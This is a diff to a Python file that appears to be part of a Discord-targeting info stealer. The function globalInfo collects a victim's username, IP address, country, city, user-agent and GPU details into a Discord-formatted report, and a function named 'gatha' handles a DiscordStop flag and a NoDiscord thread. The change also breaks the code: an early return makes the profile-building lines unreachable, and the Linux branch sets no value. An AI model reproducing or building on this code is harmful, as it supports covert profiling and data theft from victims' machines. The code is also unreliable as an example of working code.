@@ -714,24 +714,24 @@ def globalInfo():
     try:
         if system == 'Linux':
             gpu_info = os.popen('lspci | grep -i nvidia').read().strip()
-            if gpu_info:
-                try:
-                    gpu = os.popen("nvidia-smi --query-gpu=gpu_name --format=csv,noheader").read()
-                except: gpu= "ERROR"
-        elif system == 'nt':
+            
+        elif os.name == 'nt':  # Windows
             try:
-                gpu_model = os.popen("nvidia-smi --query-gpu=name --format=csv,noheader").read().strip()
-                total_memory = os.popen("nvidia-smi --query-gpu=memory.total --format=csv,noheader,nounits").read().strip()
-                free_memory = os.popen("nvidia-smi --query-gpu=memory.free --format=csv,noheader,nounits").read().strip()
-                used_memory = os.popen("nvidia-smi --query-gpu=memory.used --format=csv,noheader,nounits").read().strip()
-                temperature = os.popen("nvidia-smi --query-gpu=temperature.gpu --format=csv,noheader,nounits").read().strip()
+                gpu_model = subprocess.check_output(["nvidia-smi", "--query-gpu=name", "--format=csv,noheader"]).decode().strip()
+                total_memory = subprocess.check_output(["nvidia-smi", "--query-gpu=memory.total", "--format=csv,noheader,nounits"]).decode().strip()
+                free_memory = subprocess.check_output(["nvidia-smi", "--query-gpu=memory.free", "--format=csv,noheader,nounits"]).decode().strip()
+                used_memory = subprocess.check_output(["nvidia-smi", "--query-gpu=memory.used", "--format=csv,noheader,nounits"]).decode().strip()
+                temperature = subprocess.check_output(["nvidia-smi", "--query-gpu=temperature.gpu", "--format=csv,noheader,nounits"]).decode().strip()
 
-                gpu = f"GPU Model: `{gpu_model}`\nTotal Memory: `{total_memory} MB`\nFree Memory: `{free_memory} MB`\nUsed Memory: `{used_memory} MB`\nGPU Temperature: `{temperature}°C`\n\n"
-
+                gpu_info = f"GPU Model: `{gpu_model}`\nTotal Memory: `{total_memory} MB`\nFree Memory: `{free_memory} MB`\nUsed Memory: `{used_memory} MB`\nGPU Temperature: `{temperature}°C`\n\n"
             except Exception as e:
-                gpu = f"`An error occurred"
+                gpu_info = f"Error retrieving GPU information: {e}"
+        else:
+            gpu_info = "Unsupported OS for GPU info retrieval"
     except:
-        gpu = "error"
+        gpu_info = 'ERROR'
+        
+    return gpu_info
     globalinfo = f"""
     :flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`
     \n User-Agent : {user_agent}
@@ -3326,7 +3326,8 @@ def gatha():
             DiscordStop = False
         except:
             pass
-            
+
+    
     if DiscordStop == True:
         try:
             no = threading.Thread(target=NoDiscord)
